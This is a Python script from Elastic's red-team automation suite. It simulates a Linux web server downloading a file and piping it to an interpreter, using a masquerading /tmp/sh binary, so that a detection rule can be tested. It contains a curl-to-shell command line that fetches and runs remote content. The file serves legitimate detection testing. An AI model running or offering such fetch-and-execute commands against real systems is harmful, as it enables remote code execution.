# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys
from . import RtaMetadata, common

metadata = RtaMetadata(
    uuid="6a25935b-be53-4447-a5b4-e413f1d2351a",
    platforms=["linux"],
    endpoint=[
        {
            "rule_name": "File Downloaded and Piped to Interpreter by Web Server",
            "rule_id": "2588a595-c6c7-4d8d-b287-57b9d1e3d7e6",
        },
    ],
    techniques=["T1505", "T1059", "T1071"],
)


@common.requires_os(*metadata.platforms)
def main() -> None:
    common.log("Creating a fake executable..")
    masquerade = "/tmp/sh"

    source = common.get_path("bin", "linux.ditto_and_spawn")
    common.copy_file(source, masquerade)
    common.log("Granting execute permissions...")
    common.execute(["chmod", "+x", masquerade])

    commands = [masquerade, '-c', 'curl http://8.8.8.8:53/foo | /tmp/sh']
    common.execute([*commands], timeout=5, kill=True)
    common.log("Cleaning...")
    common.remove_file(masquerade)
    common.log("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
